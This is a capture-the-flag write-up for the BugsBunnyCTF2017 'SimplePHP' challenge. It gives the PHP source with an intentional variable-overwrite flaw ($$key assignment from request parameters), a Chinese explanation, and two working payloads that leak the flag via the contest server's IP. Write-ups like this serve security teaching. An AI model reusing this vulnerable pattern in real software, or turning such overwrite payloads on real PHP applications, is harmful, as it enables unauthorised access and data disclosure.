# Challenge
```php 
<?php
include "flag.php";
$_403 = "Access Denied";
$_200 = "Welcome Admin";
if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("BugsBunnyCTF is here :p...");
if ( !isset($_POST["flag"]) )
	die($_403);
foreach ($_GET as $key => $value)
	$$key = $$value;
foreach ($_POST as $key => $value)
	$$key = $value;
if ( $_POST["flag"] !== $flag )
	die($_403);
echo "This is your flag : ". $flag . "\n";
die($_200);
?>
```

# Solution 
有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把`$flag`直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个`die($_200)`，结合第一个foreach的功能，我们可以在第二个foreach之前先将`$_200`的值覆盖为原flag的值。

payload:
```
http://34.253.165.46/SimplePhp/index.php?_200=flag
POST:
flag=1
```

利用前面的`die($_403)`也可以实现。我们先把原flag的值覆盖到`$_403`上，然后构造`$_POST["flag"] !== $flag`，从而`die($_403)`输出flag。

payload2:
```
http://34.253.165.46/SimplePhp/index.php?_403=flag&_POST=1
POST:
flag=
```

# Refference
+ BugsBunnyCTF2017 : SimplePHP
+ [chybeta : SimplePHP](https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/#SimplePHP)